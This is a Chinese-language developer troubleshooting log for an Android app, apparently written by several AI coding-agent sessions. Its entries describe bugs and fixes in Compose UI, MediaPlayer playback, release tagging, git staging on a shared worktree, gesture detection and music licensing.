- **修法 / 怎么避开**：发版前那四步（发布 / 清单子 / 提交版本号 / 补已发布，见 #284）**前面再加一步：跑一次全套**。跑之前先把 UploadStress 的主机配上，否则那 7 条的红会把真问题盖住 —— **一直红着的测试等于没有测试**，看的人会开始忽略它。

## #287 换模型报「Model 'x' not found」——白名单里的短名不是 `/model` 吃的名字（cc-Bug_solverYxi，2026-09-06）

- **症状**：对话页点模型那一格 → 选单里挑一个（比如 `fable-5-1[1m]`）→ 会话里冒出 `Model 'fable-5-1[1m]' not found`，**模型没换**，可界面照样弹「已切到 fable-5-1[1m] · 也成了账号默认」。老板 2026-09-06 抓屏报的。
- **根因**：两套名字被当成了一套。
  · 选单名单读的是 `~/.claude/settings.json` 的 `availableModels`，那里写的是**短名**：`["default","fable-5-1[1m]","opus-4-6[1m]","sonnet[1m]","haiku"]`。
  · 而 `/model <名字>` 只认三种：**别名**（`sonnet`/`opus`/`haiku`/`fable`/`best`/`opusplan`，可带 `[1m]`）、`default`、或**全名** `claude-fable-5-1[1m]`。
  短名两头不沾 → not found。2.1.259 逐个实测（`claude --model X -p`）：`fable-5-1[1m]` ✗ · `claude-fable-5-1[1m]` ✓ · `opus-4-6[1m]` ✗ · `claude-opus-4-6[1m]` ✓ · `sonnet[1m]` ✓ · `default` ✓ · `haiku` ✓。差别只是一个 `claude-` 前缀。
  Modes.kt 早就记着「`/model opus[1m]` 不认，认全名」，但只写进了那张手写命令表；从 settings.json 读出来的那条路没过同一道加工。
- **为什么没人发现**：`switchFast` 送完键就 `return null`，**从不看屏幕**。失败时 Claude Code 只在屏幕上写一行，不弹框、没有别的信号 —— 于是失败和成功在界面上长得一模一样。跟 #285 是同一类病：**没有回执就自己编一个**。
- **修法 / 怎么避开**：
  · `Model.canonical()` —— 不是别名、不是 `default`、没带 `claude-` 前缀的，一律补 `claude-`；**别名绝不能补**（`claude-sonnet[1m]` 不是模型名）。放在 `switchFast` 入口，两条调用路（选单 / 模式面板手写命令）都走它。
  · 送完之后抓一次屏，只翻**自己那条命令之后**那一截（整屏找会把上一次的旧错永远重报），压平再找（窄窗格会把这行折断，同 #113/#133）。看到 `not found` / `unrecognized_model` / `Kept model as …` 就当失败原样报出来。
  · 用例 `ModelTest.白名单的短名要补全才喂得进model`。
  · ⚠️ **改 Claude Code 版本要重验这张表** —— 认哪些名字是它内部的清单（2.1.259 在 `WP` / `B3t` 两个数组里），跟着版本走。

## #288 结算页「一屏塞得下」是假设不是事实 —— 十连在大字体下被切掉，切掉的那几张永远看不到（cc-Yxi_Entertainment，2026-09-06）

- **症状**：祈愿十连的结算弹窗，抽到角色时是「一张立绘 + 九张小卡」。默认字号下**刚好**卡在屏幕边缘看着没事；
  把系统字号调到 1.5，第 10 条整个在屏幕外。想滑一下看看 —— 弹窗直接关了，那一条到死也看不到。
- **根因**：两个叠一起。
  · 结算卡是个**不滚动**的 `Column`（`fillMaxSize` + `Arrangement.Center`）。内容超一屏就是被裁掉，Compose 不会替你加滚动。
  · 外面那层 `Box` 挂着 `clickable { onClose() }`。**没有滚动的孩子去消费拖动手势**，一划就变成一次点击 → 关窗。
  开发时只在默认字号、只在没出角色的十连（10 条正好排满）上看过，所以从来没露过。
- **修法 / 怎么避开**：
  · 给那个 `Column` 加 `Modifier.verticalScroll(rememberScrollState())`。加完顺带解决了误关 —— 滚动的孩子会先吃掉拖动，单纯的点击照样穿到父层。
  · ⚠️ **不用**再套 `BoxWithConstraints` + `heightIn(min = 一屏)` 去保住居中。`verticalScroll` 测量孩子时用的是
    `constraints.copy(maxHeight = Infinity)`，**`copy` 会把 `minHeight` 原样留着**，所以
    `Arrangement.Center` 在内容没超屏时本来就还是居中的。多套那一层的代价是真的：
    `BoxWithConstraints` 是 `SubcomposeLayout`，而它的 content 里读了每帧都在变的动画时间 —— 整棵子树每帧在测量阶段重新子组合；
    再加上 px→dp→px 的往返误差会让 `minHeight` 比视口多 1px，单抽那张卡从此永远能滚一格（有过冲光晕）。
  · 底部悬浮的那行提示（「点一下关闭」）要 ①有渐变底衬，不然滚动时卡片从白字底下穿过去两样都看不清；
    ②给列表留出的底部空间**别写死 dp** —— 字号一大它就折成两行。用 `onSizeChanged` 量它实际多高再让位，
    并且它自己要 `windowInsetsPadding(WindowInsets.navigationBars)`（`decorFitsSystemWindows = false` 的弹窗里，
    写死的 34dp 有一半被手势条吃掉）。

## #289 同一份 JSON 解析抄了两份，服务端加字段只有一半界面能看见（cc-Yxi_Entertainment，2026-09-06）

- **症状**：服务端给抽卡结果加了 `byPity`（这一发是不是保底给的）。祈愿**历史页**能显示「保底」小标，**十连结算页**死活不显示。
- **根因**：`Wish.kt` 里 `Got` 的解析写了两份 —— `got()` 一份，`draw()` 里手抄了一份一模一样的。
  加字段时只改了 `got()`。讽刺的是 `got()` 的注释原文就写着「history 与 draw 共用一个形状，解析也只该有一处」，
  抄的人没看见，看的人没删。
- **修法 / 怎么避开**：`draw()` 改成 `o.optJSONArray("results").list(::got)`。
  · 一般规律：**同一个 data class 的解析在仓库里只准有一处**。加字段前先 `grep` 一遍构造点
    （`grep -n 'Got(' `），有两处就先合并再加字段，别加完两处对着调。
  · 顺带一条计数的同类错：卡牌库印「已收集 27 / 9」—— 分子用的是服务端给的**全部藏品 id**（角色 + 装扮 + 语包），
    分母只有角色数。`owned.size` 看着天经地义，但 `owned` 从来就不是「角色的集合」。
    修成 `CROWNS.count { owned.contains(it.id) }`。**分子分母来自不同集合时，先问一句它俩是不是同一个域。**

## #290 用「上次发版收尾提交以来」核清单，会漏掉发版当口进的改动（cc-Bug_solverYxi，2026-09-06）

- **症状**：1.1.18 发版前问一圈「有没有没进清单的改动」，用 `git log f843355..HEAD`（`f843355` = 1.1.17 收尾）数出来只有 4 条抽卡/祈愿的，**换模型那条（`117d860`）不在里面** —— 而它恰恰是这一版要发的三条之一。
- **根因**：**收尾提交是构建之后才打的**（#284 那四步：发布 → 清单子 → 提交版本号 → 补已发布），构建到收尾之间有个几十分钟的窗口。这段时间里别人提交的东西按时间排在收尾提交**下面**：
  ```
  f843355  14:27  发版 1.1.17 收尾        ← 构建（13:54）之后才打的
  40ad4fe  14:25  音游试验台第二版
  117d860  14:24  换模型 not found 修复    ← 没进 13:54 那个包，却排在收尾提交下面
  ```
  于是「收尾提交以来」这个口径**两头都不对**：它既漏掉了没进包、该进下一版的（117d860），也会把窗口里那些人当成「上一版发过了」。
  ⚠️ 判断「进没进包」唯一算数的是**包本身**，不是提交顺序 —— 这次是靠 release APK 的时间（13:54 < 14:24）加上 dex 里搜不到新代码的字符串（`unrecognized_model` / `Kept model as`）确认的。
- **修法 / 怎么避开**：**从 1.1.18 起打 tag**（cc-Yxi）：构建完、版本号提交后打 `v1.1.18`，**指向真正构建的那个提交**（不是收尾之后的 HEAD）。以后核「哪些进了包」一律
  ```
  git log v1.1.17..v1.1.18
  ```
  不再用「收尾提交以来」。⚠️ tag 打错位置（指到收尾提交或 HEAD）这条口径就又坏了，和现在一样 —— 打完顺手 `git show <tag> --stat` 看一眼是不是那个提交。
  ⚠️ 没有 tag 的那些老版本（1.1.17 及以前）别硬用 tag 口径倒推，回去查包：`ls -l` 看 APK 建于何时 + `unzip -p app-release.apk 'classes*.dex' | grep -a <改动里的新字符串>`。

## #291 Kotlin 的块注释会嵌套 —— 注释里写个 `*.js` 路径，整个文件后半截都成了注释

- **症状**：`Fx.kt:62:1 Syntax error: Unclosed comment`，同时别的文件里 `Named` / `HitFx` 全部 Unresolved —— 三个正在移植的子 agent 同时编不过，看着像他们的问题。
- **根因**：Kotlin 的 `/* */` **允许嵌套**（Java 不允许）。文档注释里写了 `design/hit/*.js`，其中的 `/*` 又开了一层注释，之后再也没有配对的 `*/`，编译器把后面所有代码都当注释吃了。
- **修法**：注释里别出现 `/*`（路径通配写成「design/hit 目录里的 js」）。查法：`grep -n '/\*' 文件` 看有没有多出来的开头。
- **教训**：多人同时编一个模块时，**先怀疑共享文件**。三个人同时红，大概率是同一个源头。

## #292 全套仪器测试跑到一半「Process crashed」—— 不是代码，是别人在同一台模拟器上 force-stop 了被测进程

- **症状**：`connectedAndroidTest` 跑到第 105 条（UploadStressTest）突然 `INSTRUMENTATION_RESULT: shortMsg=Process crashed`，后面 160 条没跑；logcat 的 crash 缓冲区里只有 uiautomator 自己的崩溃，没有 app.yxi 的 FATAL。
- **根因**：同一时间 pilot 在这台模拟器上验别的改动，跑了 `am force-stop app.yxi`（还有他自己的 34 条仪器测试，也会重启被测进程）。instrumentation 正测着的进程被外部停掉，runner 就报 Process crashed —— 表现得像代码崩了，时间线对上才知道是人。
- **为什么难查**：四个会话共用一台模拟器，谁在用全靠群里喊一声；今天已经第三次互相顶掉（pilot 顶 logto、omggrow 顶 cc-Yxi、这次）。
- **修法**：① 排除法先做 —— 去掉出事的类重跑（`-e notClass …`）看剩下的是不是全绿，再单独补跑那个类；② 上机前后群里各说一句；③ **emu.sh 加锁**（`claim <名字>` 写锁文件，`install / shot / adb` 看到别人的锁就拒绝并打印占用者，30 分钟过期）—— 派给 pilot 了，靠自觉今天证明了不够。
- **教训**：**共享设备上「莫名的崩」先看时间线上有没有别人**，再看代码。

## #293 外来曲子打完被服务端判「没打完不算成绩」—— 结尾淡出让最后一个音符太早，客户端提前结算

- **症状**：模拟器上完整打完 シャイニングスター 轻松，判定数 115 == units（对的），结算页却写「这一局比曲子短太多，没打完不算成绩」，成绩没入库。
- **根因**：客户端的结束条件是「最后一个音符 + 2.5 秒」。自家合成的三首谱面音符铺到曲尾，没事；魔王魂的短版结尾淡出，`chart_from_audio.py` 只在起音够强处放音符，最后一个音符在 77 秒、曲子 94 秒 → 79.6 秒就结算 → `elapsedMs / durationMs = 0.84 < 0.9` → 服务端 `too_fast`。服务端没错，它就是为「没真打完」设的。
- **修法**：结束条件改成「最后一个音符过了 2.5 秒 **且** 曲子放到接近结尾（`song.seconds - 0.8`）」，播放器自己停了也算。谱面生成侧不动（淡出段本来就不该放音符）。
- **教训**：**加一类新数据（外来曲子）时，把旧数据里的隐含假设挖出来** —— "音符铺满曲子"从来没写在任何地方，它只是自家曲子恰好如此。E2E 要打到结算页，判定数对了不算完，服务端收了才算。

## #294 视频动画的收尾计时用墙钟 = 每次都被砍掉尾巴，接缝原样回来（cc-Yxi_Entertainment，2026-09-07）

- **症状**：抽卡短片片尾特意烤了 0.45 秒淡入结算卡底色，为的是换卡那一刻两边同色、看不出接缝。
  实际上接缝还在，而且**越慢的机器越明显**。
- **根因**：收尾时刻是拿「擦完那一刻」当零点算的（`now - burstAt > clipLen`），
  而墙钟跟播放器毫无关系。真正开播要走 TextureView attach → `onSurfaceTextureAvailable` →
  `MediaPlayer.create()`（**在主线程同步 prepare**，实测 0.1–0.4 秒，低端机更久）→ `start()` → 首帧。
  于是视频只播到 `clipLen − 起播延迟`，**淡入还没走完就换卡**。起播慢到 0.6 秒以上时淡入压根没开始。
- **修法 / 怎么避开**：
  · 零点换成**播放器真的 `start()` 那一刻**（`onPrepared` 里回调，外面记 `playAt`）；
    再加两条出路：失败立刻收（`bail`）、起播卡死有兜底（`burstAt + clipLen + 2.5s`）。
  · `MediaPlayer.create()` 换成 `MediaPlayer()` + `setDataSource(afd)` + `prepareAsync()`，
    顺带把主线程那 100–300 毫秒的卡顿也去掉。
  · ⚠️ `AndroidView` 的 `factory` **只跑一次**，闭包捕获的是第一次组合的 lambda ——
    回调必须 `rememberUpdatedState` 包一层，否则是死引用。
  · 一般规律：**任何跟外部播放器/解码器对齐的动画，零点都要由那个组件回调给你，不能自己掐表。**

## #295 两个 Dialog 直接 if/else 换 = 中间有一两帧谁都没盖住屏幕（cc-Yxi_Entertainment，2026-09-07）

- **症状**：抽卡从「擦星星」换到「结算卡」时闪一下白。片尾淡入调得再准都救不了。
- **根因**：两个 Dialog 是**各自独立的窗口**。`if (!wiped) Dialog{擦} else Dialog{结算}` 这么写，
  上一个窗口先撤、下一个还没上，中间那一两帧**底下的页面直接露出来**（浅色主题下接近白）。
  22 秒录屏里量到第 13.20–13.27 秒两帧 `#FCF9FC`。问题不在颜色，在"没人盖住"。
- **修法 / 怎么避开**：让两层**交叠一小段**（220ms 够）——
  `if (!covered) Dialog{擦}` + `if (wiped) 结算卡`，`covered` 在 `wiped` 之后延迟置位。
  结算卡后组合 = 后加的窗口 = 盖在上面，等它确实盖住了，上面那层才撤。
  ⚠️ 顺带两条同源的坑：两个 Dialog 的**底色必须是同一个常量**（一个 `0xFF` 一个 `0xF2` 就会跳），
  `decorFitsSystemWindows` 也要一致（不一致的话状态栏/导航栏那两条带子会「啪」地变）。

## #296 脚本改文件失败、后面的 `git add` 照跑 → 把别人未提交的改动卷进自己的提交（2026-09-07，一天里两个人各踩一次）

- **症状**：提交里多出别人的改动，而自己本来要加的那行根本没进去。
  今天两起：`cc-Yxi_Entertainment` 的 handover 脚本锚点没匹配上（发版后那段被重写过），
  条目没写成，但后面 `git add handover.md` 照跑，把 `cc-Yxi_pilot` 未提交的四行带走了；
  `cc-Yxi` 的 `git add -A` 把 pilot 的扫一扫卷了进去。
- **根因**：脚本里「改文件」和「提交」是**两步**。第一步失败（assert / 匹配不到 / 写权限），
  第二步照样执行 —— `git add <文件>` 加的是**文件当前的全部改动**，不管这些改动是谁的。
  `set -e` 也救不了：改文件那步在 python 里、提交那步在 shell 里，是两条独立命令。
- **修法 / 怎么避开**（后一条比前一条硬）：
  · ⭐ **让 add 依赖于改成功**：`python3 fix.py && git add <路径>` —— 用 `&&` 串起来，
    改失败就根本走不到 add。这条是结构上的保证，不靠人记得。
  · **只 add 明确的路径，永远别 `git add -A` / `git add .`**（多人共用工作树时尤其）。
  · 动共享文件（handover.md / TROUBLESHOOTING.md / En.kt）之前先 `git status --short` 看一眼
    有没有别人的未提交改动 —— 这条是补充，不能替代上面两条：它靠自觉，前两条靠机制。
- **补记**：真卷进去了也**别 revert**（尤其发版前动历史不值当）。核对内容没丢、
  代码提交的署名对了就够了，共享文档谁提交进去的不重要；跟对方说一声、补上自己漏掉的那行即可。

## #297 幂等键在函数体里生成 = 每次调用都是新键 = 幂等等于没做（cc-Yxi，2026-09-07）

**症状**：`Rhythm.submit()` 往请求体里塞 `requestId = UUID.randomUUID()`，看起来有幂等键；但它是在**函数体里现生成**的，谁再调一次 submit 就是一个新 id —— 服务端按 requestId 去重的那套形同虚设。今天没炸只是因为结算页只交一次（`ResultCard` 的 `LaunchedEffect(chartId)` 一局跑一遍，`Account.apiRaw` 也不自带重试）；将来谁加一个「超时重交」按钮，同一局就会被服务端当成两局（多算局数 / 多发一次奖）。Entertainment 做微曦时先撞上的（服务端 replay 分支漏字段，见 #296），反查到我们这条。

**根因**：幂等键的**生存期跟错了东西**——它必须跟「这一局 / 这一次业务动作」绑定，而不是跟「这一次网络调用」绑定。生成点放在发请求的函数里，就必然是后者。

**修法 / 怎么避开**：
- 键在**业务动作产生的地方**生成、随动作一起活着：Compose 里 `remember { UUID.randomUUID().toString() }` 放在结算页（或祈愿那种 `pendingId`，失败就留着、成功才清空，见 WishScreen.kt），作为参数传给 submit。发请求的函数只接收键，**永远不自己造**。
- 加「重交」入口前先问服务端对重复上报的语义：只更新最好成绩（无害）/ 计局数（多算）/ 按局发奖（多发 = bug）。
- 审代码时的一眼判据：`randomUUID()` 出现在 `suspend fun xxx(...) = withContext(IO) { ... }` 里面 → 大概率就是这个坑。

## #298 输入框状态存 String = 没有光标：语音只会往尾巴上追加，框也滚不到新出来的字（cc-Bug_solverYxi，2026-09-07）

- **症状**（老板 2026-09-07 报的两条，其实是一条）：
  · 语音说的话**永远接在草稿末尾** —— 把光标挪到中间再说，还是追加到尾巴。
  · 输入框最多 7 行，**说满之后看不到最新识别出来的字**：框停在最上面，新字在看不见的下面，要等全部说完、手动往下拉才看得见。
- **根因**：草稿存的是 `var draft: String`，而 **String 里没有光标**。于是：
  · 插字只能 `draft.trimEnd() + " " + said` —— 除了尾巴没有第二个位置可选；三条语音路（系统识别 / 按住说话 / 录音条停止）各抄了一份同样的写法。
  · `BasicTextField` 的 **String 重载把选区藏在框内部**，外面改不着。而框超过 7 行之后**滚到哪是跟着光标走的** —— 光标一直停在旧位置，新字就落在视口外面。两个症状同一个因。
- **修法 / 怎么避开**：状态改存 `TextFieldValue`（text + selection 一体），`ChatScreen` 里 `draftV`；插字统一走 `insertSpoken(cur, said)` —— 按 `selection.start` 插、插完把光标放到插入内容之后，框自己就滚过去了。用例 `ui/SpokenInsertTest`（5 条：插在光标处 / 空草稿不带前导空格 / 尾部只留一个空格 / 选中一段只插不删 / 光标越界夹回）。
- ⚠️ **别把 TextFieldValue 拆成 text + selection 再拼一个新的**（那样看着更省事）：拼的时候 `composition` 会丢，中文输入法正拼一半的那段被打断 —— #224「输了文字删不掉了」就是这一类。要么整个原样存回去，要么别碰。
- ⚠️ 语音是**补话不是替换**：选区是一段范围时按 `start` 插、不删选中的字。吃掉用户已经打好的字是不可逆的。

## #299 音游 swipe 真机划不中、模拟器 adb 快甩能中 —— 判定看的是「动作形状」不是「有没有划」（cc-Yxi，2026-09-07）

**症状**：老板真机「左滑右滑都没有真正被触发」；我在 Mac 模拟器上用 `adb shell input swipe` 按谱面时刻甩，三个 swipe 全 PERFECT。代码和网页试验台一模一样，读不出毛病。

**根因**：原规则是「手指**落下 0.45 秒内**划过 3% 屏宽，且**一次触摸只认一回**」。adb 的 swipe 就是 DOWN 立刻 MOVE 再 UP，正好是这个形状；真人常见的却是**先按住等音符到线再划**（落下早就超过 0.45 秒）、或者**手指不抬着连着左右扫**（第二下起全被 `swiped=true` 吃掉）。两种都判不中，屏幕上看不出任何差别。

**修法**：改成看**最近 0.18 秒内的位移**（`trail` 轨迹）> 3% 屏宽就算一次 swipe；换方向立刻可再触发，同方向 0.30 秒后可再触发。用 `adb shell input motionevent DOWN / MOVE / UP` 复现「按住 0.8 秒再划」「不抬手右→左」两种形状，改后都中（logcat 标签 `YxiRhythm` 里能看到每个判定和 swipe 触发）。

**怎么避开**：触摸手势的 E2E 别只用 `input swipe` —— 它只代表一种手型。至少再补「按住再动」「不抬手连做」两种 `motionevent` 序列；判定日志打到 logcat（屏幕上只看得到结果，看不到「为什么没中」）。

## #319 素材是「录屏」时，播放器 UI 会被一起裁进去；而改了画面比例，按旧分母标定的常量必须一起改（cc-Yxi_Entertainment，2026-09-07）

- **症状**：抽卡界面底部露出视频播放器的进度条（「00:00 / 00:15」）。老板在真机上一眼看到，
  已经随 1.1.19 发出去了。
- **根因**：短片素材是老板**用手机录屏**录的 —— 录的是一个播放器在播视频，
  播放器的**控制栏 + 它上面的渐变蒙版**占了原片底部 82 行（608×1000 里的 918–999），
  而我按整帧裁的。它**只在每一遍播放的前 3 秒可见**（控件会自动隐藏），
  而通用蓄力段正好截自那一段 —— 揭晓段反而是干净的，所以逐帧翻中段看不出来。
- **修法 / 怎么避开**：
  · 拿到任何**录屏**素材，先扫一遍**四条边**有没有 UI（控制栏 / 状态栏 / 播放按钮 / 水印）。
    ⚠️ 别只看中间几帧：播放器控件会自动隐藏，**开头几秒和你手贱点一下之后**才有。
    这次同一段素材还在 0.25–0.50 秒有个 ▶ 播放按钮，是另外抓出来的。
  · 裁掉之后**别用纯色补回原尺寸**：片子自己的底色是 #D5DCDE 一类、还因为调色各档不同
    （实测四档边缘色 (227,218,215) / (228,217,220) / (222,219,231) / (215,222,228)），
    任何一个纯色都补不上，会多出一条更亮的横带。**只裁不补、把比例常量改掉**才干净。
  · ⚠️⚠️ **改了比例，所有按旧分母标定的常量都要跟着改**。这次 `aspectRatio` 从 608/1000
    改成 608/918，但 `starCenter` 里的 `size.height * 0.52f` 是按 1000 标的 ——
    同一个 0.52 从「她怀里的星星」飘到了「她的脸上」，偏了超过半个光晕半径。
    **办法**：这类分数在注释里写成 `520/918` 的形式而不是算好的小数，分母一眼可见。

## #320 `LaunchedEffect(Unit)` 拉一次的数据，在「做完动作立刻回来看」的路径上必然是旧的（cc-Yxi_Entertainment，2026-09-07）

- **症状**：卡牌库新加了「命座 N」。抽到重复角色、结算页刚说完「已有 · 命座 +1」，
  点进卡牌库 —— 数字没动。**比不显示还糟**。
- **根因**：收藏是 `LaunchedEffect(Unit)` 在进祈愿页时拉的，一辈子只跑一次；
  抽卡成功只更新了余额和保底，没重取收藏。
- **修法 / 怎么避开**：key 换成**打开那个界面的开关**（`LaunchedEffect(library) { if (library) … }`），
  「要看的时候才拉」。一般规律：**做这类"看结果"的功能时，先问一句「用户会不会做完动作立刻回来看」** ——
  会的话，`LaunchedEffect(Unit)` 就是错的 key。

## #300 给渲染表加元素，配套的常量表没跟着扩 → 跳档时数组越界必崩，截图 E2E 看不出来（cc-Yxi，2026-09-07）

**症状**：给底光加了两团「高潮才浮出来」的光（blobs 4 → 6），琥珀色表 `AMBER` 还是 4 个；`paint({ i -> AMBER[i] })` 遍历六团，连击到档位（warmK > 0）那一下 `ArrayIndexOutOfBoundsException`，整个 App 崩。模拟器上演示模式一跑到 8 连击就死；截图 E2E 只截前几秒看不出来，是 opus 审查按代码路径推出来的，logcat 里 `FATAL EXCEPTION` 一条印证。

**根因**：两张表靠「下标对齐」隐式耦合，改一张不改另一张编译器不报错。

**修法 / 怎么避开**：`AMBER[i % AMBER.size]`；以后凡是 `xs.forEachIndexed { i -> ys[i] }` 这种并行数组，要么合成一个对象数组，要么取模。E2E 前 `logcat -c`，跑完 `grep -c "FATAL EXCEPTION"`，崩没崩用数字说话。

## #301 Kotlin object 里 `val` 按声明顺序初始化：默认参数引用后面声明的 val → ExceptionInInitializerError（cc-Yxi，2026-09-07）

**症状**：进活动页直接崩，`ExceptionInInitializerError at ActivityScreen.kt:207`（第一次碰 `Rhythm` 对象的地方）。
**根因**：`data class Song(..., val diffs: List<String> = DIFFS)`，`SONGS` 列表在 `DIFFS` **之前**声明；object 初始化到 SONGS 时 DIFFS 还是 null，默认参数求值 NPE，被包成 ExceptionInInitializerError。编译器不报。
**修法**：被默认参数引用的常量放到使用它的声明**前面**（已加注释钉住）。看到 ExceptionInInitializerError 先查 object 里的声明顺序。

## #302 在 hk13 上用 urllib 拉自己的公网 URL 被 403；发布清单先同步服务端再公开（cc-Yxi，2026-09-07）

**症状**：发布脚本在 hk13 上跑 logto 的 `rhythm-sync.py https://yxi.keuury.com/rhythm/songs.json.new --apply`，`urllib.error.HTTPError: 403 Forbidden`；本机 curl 同一个 URL 却 200。
**根因**：从服务器自己出去再回来的请求走了带 UA 过滤的那一层（python-urllib 的默认 UA 被拦），curl 的 UA 不拦。
**修法**：同一台机器上直接传**本机路径** `/var/www/yxi/rhythm/songs.json.new`（脚本本来就吃路径）。顺序不能反：先 sync（服务端认识新谱）再把 `.new` 改名公开，否则客户端下到谱、服务端 `no_such_chart`。

## #303 兑换码在界面上从来没显示过 —— 显示和复制的都是附件的 `name`（cc-Yxi_Entertainment，2026-09-07）

- **症状**：站内信里带兑换码的附件，界面显示一行「兑换码 · 长按复制」，长按复制到剪贴板的是
  **「兑换码」这三个字**。买来的更荒唐：显示「PRO 会员 30 天」、复制到的也是这七个字。
  正文还写着「兑换码见附件」。
- **根因**：码在附件的 **`code` 字段**里，而客户端 `Account.Attach` 只解析了 `kind / amount / name`，
  **压根没有 `code`**。`name` 是标签（后台发信固定写「兑换码」、商城购买写商品名），不是码。
  这个洞从功能上线起就在，一直没人发现 —— 因为**没有任何报错**，界面看着是完整的。
- **发现的经过**：给到期清理写文案时加了一句「先抄下来」，子代理审查指出
  **「App 让用户抄一个屏幕上不存在的东西」** —— 是新文案把这个哑 bug 变成了一句会挨骂的谎话。
- **修法 / 怎么避开**：`Attach` 加 `code`，显示和复制都走 `code.ifEmpty { name }`（码用等宽字体）。
  · 一般规律：**契约里有的字段，客户端要么解析要么在注释里写明为什么不解析**。
    只解析一部分、界面拿相邻字段顶上，是最难发现的一类 bug —— 它不崩、不报错，只是**一直在说假话**。
  · 写「让用户做某件事」的文案时，**先确认界面上真的有那件事可做**。这条文案救了那个 bug。

## #304 「已经领过」和「有可领的」是两回事，判据用错会说反话（cc-Yxi_Entertainment，2026-09-07）

- **症状**：一封已经领过的信，在「已领取」下面紧跟一句光秃秃的「这封信 30 天后自动清理」，
  读起来像「我领到手的东西 30 天后也要被清掉」。
- **根因**：判据用了 `m.claimable`，而它的定义是「**还没领** 且有可领附件」。领完之后它变 false，
  于是落到兜底那句。真相是东西早进账了，信删不删跟它无关。
- **修法 / 怎么避开**：判据换成 `attachments.any { it.grantable }`（**有没有**，不看领没领），
  文案写成时态中性的一句，领过和没领过共用。
  · 同一批还踩到：`code` 和「可领」**不是互斥的** —— 后台发信表单把四种附件拼进同一个数组，
    「码 + 曦光」是常态不是边角。分支写成 `when { code -> …; grantable -> … }` 会把
    混合信的「会自动入账」那半吞掉，正是用户最在意的一半。四种组合要各有各的话。

## #305 抽卡黑屏：`prepareAsync()` 之前 `use { }` 把 fd 关了 —— 部分真机静默失败（根因 cc-Yxi_Entertainment 定位，2026-09-07）

- **症状**（老板 2026-09-07 截图）：抽到东西、擦完之后，屏幕中间**一整块深色**十来秒，四周还是浅灰，然后才跳结算卡。模拟器上从来复现不出来，E2E 全绿。
- **怎么从一张截图定位到版本和状态的**（留着当查法）：量那块深色的实心 bbox —— `1163×918` 比例 **0.6623**，跟 `608/918` 完全相等（三代舞台比例 0.615 / 0.608 / 0.662，只有这一代对得上）→ **他在 1.1.21，查的是现网代码**；宽/屏宽 0.920 = `fillMaxWidth(0.92)` → 那块就是舞台。再看**四周还是 Paper**（浅灰）：片尾淡入结算卡底色是整屏一起淡的，四周没淡 ⇒ `tail == 0` ⇒ **`playAt` 一直是 -1**，也就是播放器**从来没开播**，不是「停在片尾黑帧」。
- **根因**：`RarityClip` 里
  ```kotlin
  c.resources.openRawResourceFd(resId).use { fd ->
      player.setDataSource(fd.fileDescriptor, fd.startOffset, fd.length)
  }
  player.prepareAsync()          // ← 真正去读 fd 发生在这之后
  ```
  `use { }` 在块尾就把 `AssetFileDescriptor` 关了，而 `prepareAsync()` 是**异步**的：不少 OEM 实现要到 prepare 阶段才真去读那个 fd，此时 fd 已关 → prepare 失败，而且**部分机型是静默失败**：`onPrepared` 不回调、`onError` 也不回调。于是 `playAt` 永远 -1，屏幕停在一块一帧都没有的 TextureView 上（TextureView 默认不透明 → 显示成 #181B22），一直等到 `burstAt + clipLen + 2.5s` 那条兜底才收。
  这个洞是把 `MediaPlayer.create()`（内部自己管 fd）改成 `prepareAsync()`（为了不在主线程同步 prepare 卡 0.1–0.4 秒）时引入的，`use` 顺手包上去的。
- **修法 / 怎么避开**：
  · **afd 不要 `use`** —— 用 API 24+ 的 `setDataSource(afd)` 重载，afd 存起来（这儿是 `hold[2]`），跟 MediaPlayer / Surface **一起收**（三个释放点统一走一个 `drop()`，别再分散写三份）。
  · **兜底要认「起播没来」这一种**：`burstAt >= 0 && playAt < 0 && now - burstAt > 2.5s` 就收 —— 静默失败没有任何回调，只能靠「该来的没来」判。起播实测 0.1–0.4 秒。
  · `TextureView.isOpaque = false`：首帧到达前让底下的擦拭图透出来。**这只是第二道防线**（把黑洞变成静止图），不是修复。
- ⚠️ **这类账「模拟器过了」不算数**：模拟器是 swiftshader + 软解，容忍已关闭的 fd；真机不容忍。凡是碰 fd / 解码器 / GPU 路径的改动，绿的 E2E 说明不了问题，要么真机验，要么把失败路径设计成可观测的（就是上面那条兜底）。

## #306 量「多久」用 uiautomator 轮询 = 拿米尺量毫米（cc-Bug_solverYxi + cc-Yxi_Entertainment，2026-09-07）

- **症状**：验「点『跳过』能不能立刻收掉短片」，用 `uiautomator dump` 轮询判断结算卡出现的时刻，量出来是「点下去 2.5 秒后才出卡」，差点写成**「点击区没生效」**。同一天 Entertainment 用截图轮询验短片播没播，一趟三五秒，也看不出结果（还顺带撞了别人正在跑的仪器测试）。
- **根因**：`uiautomator dump` 单次约 **1.2 秒**、`screencap` 一趟也要几百毫秒到几秒。要量的响应是 **0.2 秒**级 —— 采样周期比被测量本身大一个数量级，量出来的「时刻」全是采样点的时刻，不是事件的时刻。**误差方向还偏向「更晚」**，于是稳定地把「立刻生效」误判成「没生效」。
- **修法 / 怎么避开**：**要量「多久」就录屏，要看「是什么」才用 dump。**
  · `adb shell screenrecord --time-limit N --size 540x1200 /sdcard/x.mp4` → 拉回来用 ffmpeg 逐 0.1 秒抽一帧，量某块颜色什么时候翻转（这里用的是「四周底色变暗＝结算卡出现」）。同一条录屏还能顺带看别的（舞台中心一直是亮的 ⇒ 片子在播）。
  · ⚠️ **ffmpeg 在 Mac mini 上没装**，把 mp4 拉回本机（Linux）再分析。
  · 换算清楚再下结论：这次「点跳过 t=8.0 → 四周变暗 t=8.2」对上「自然播完要 12.7~13.6」，才敢说点击区是好的。
  · 现成脚本：抽卡播放不回归 `clipcheck.sh`（Entertainment）、跳过响应 `skip2.sh`（本条）。

## #307 免费 BGM 站的「只能当 BGM」条款 —— 音游正好踩中；下载前先找这一句（cc-Yxi，2026-09-07）

**症状**：子代理按「商用 OK + 游戏 / アプリ OK + 署名」核过条款、下好了曲子、谱也出了、都发到公网了，另一路调研才发现 PeriTune 写着「楽曲は必ずコンテンツの背景（BGM）として使用してください」、DOVA 写着禁止「エンドユーザーに音源を聴かせることを主な目的とした…アプリ」、MusMus 禁止「楽曲を視聴させることを目的としたコンテンツ」。音游里曲子就是主内容，这些全踩。已撤 PeriTune 那首。
**根因**：核条款时只看「商用 / 游戏」两个词，没找「音楽が主体 / 聴かせる目的 / BGMとして」这一类反向条款。
**怎么避开**：以后核条款必须**三问**：① 商用 + 法人 + アプリ；② **有没有「只能当 BGM / 禁止以听音乐为目的」**；③ 署名原话。有 ② 的一律不用。CC BY 4.0（OtoLogic）和魔王魂规约没有 ②。

